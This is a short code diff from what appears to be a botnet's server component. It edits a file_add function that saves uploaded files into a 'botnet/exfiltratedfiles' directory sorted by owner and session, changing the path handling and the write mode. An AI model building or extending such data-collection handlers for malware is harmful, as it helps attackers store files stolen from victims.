@@ -18,10 +18,10 @@ def file_add():
  
 	filename += '.' + filetype
 
-	output_path = os.path.join(os.getcwd(), 'botnet\\exfiltratedfiles', owner, session, filename)
+	output_path = os.path.join('botnet/exfiltratedfiles', owner, session, filename)
 
 	file_dao.add_user_file(owner, filename, session, module)
 
-	with open(output_path, 'wb') as fp:
-		fp.write(data)
+	with open(output_path, 'w') as f:
+		f.write(data)
 
